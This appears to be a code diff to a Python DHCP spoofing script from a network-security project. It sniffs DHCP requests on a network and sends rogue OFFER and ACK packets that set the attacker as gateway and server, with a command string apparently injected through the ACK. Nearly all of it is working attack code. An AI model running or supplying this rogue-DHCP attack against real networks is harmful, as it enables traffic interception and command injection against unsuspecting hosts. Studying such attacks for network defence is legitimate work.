@@ -1,6 +1,5 @@
 # https://github.com/shamiul94/DHCP-Spoofing-Attack-Network-Security/blob/master/Final-Codes/dhcp_spoofer.py
 
-import binascii
 import ipaddress
 from Project import *
 
@@ -65,19 +64,17 @@ def make_dhcp_ack_packet(raw_mac, xid, command):
 
 def send_rogue_dhcp_offer_packet(packet):
     mac_addr = packet[Ether].src
-    raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
 
     xid = packet[BOOTP].xid
     print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))
 
     print('XXXXXXXXXXXXXX Rogue OFFER packet on BUILD XXXXXXXXXXXXXX')
 
-    new_packet = make_dhcp_offer_packet(raw_mac, xid)
-    # print('New Packet data is:')
-    # print(new_packet.show())
+    new_packet = make_dhcp_offer_packet(mac_addr, xid)
+    #print('New Packet data is:')
+    #print(new_packet.show())
     print("\n[*] Sending Rogue OFFER...")
-    #sendp(new_packet, iface=values.get("iface"))
-    sendp(new_packet, iface=source_mac)
+    sendp(new_packet)
 
     print('XXXXXXXXXXXXXXX  Rogue OFFER packet SENT XXXXXXXXXXXXXX')
     return
@@ -85,20 +82,19 @@ def send_rogue_dhcp_offer_packet(packet):
 
 def send_rogue_dhcp_ACK_packet(packet):
     mac_addr = packet[Ether].src
-    raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
 
     xid = packet[BOOTP].xid
     print("[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid))
 
     print('XXXXXXXXXXXXXX Rogue ACK packet on BUILD XXXXXXXXXXXXXX')
 
-    new_packet = make_dhcp_ack_packet(raw_mac, xid, command)
+    new_packet = make_dhcp_ack_packet(mac_addr, xid, command)
 
-    # print('New Packet data is:')
-    # print(new_packet.show())
+    #print('New Packet data is:')
+    #print(new_packet.show())
     print("\n[*] Sending ACK...")
     #sendp(new_packet, iface=values.get("iface"))
-    sendp(new_packet, iface=source_mac)
+    sendp(new_packet)
     print('XXXXXXXXXXXXXX Rogue ACK packet SENT XXXXXXXXXXXXXX')
 
     return
@@ -207,7 +203,8 @@ def spoofing(values):
     fake_your_ip = ipaddress.ip_address(fake_my_ip) + int(ipaddress.ip_address('0.0.0.1'))
     fake_server_ip = values.get("source_ip")
     fake_router_ip = values.get("source_ip")  # default gateway
-    source_mac = values.get("source_mac")
+    source_mac = values.get("source_mac_address")
+    print(values.get("source_mac_address"))
     command = "echo 'pwned'"
     print("Waiting for DHCP request to spoof ACK and OFFER")
     sniff(iface=values.get("iface"), filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
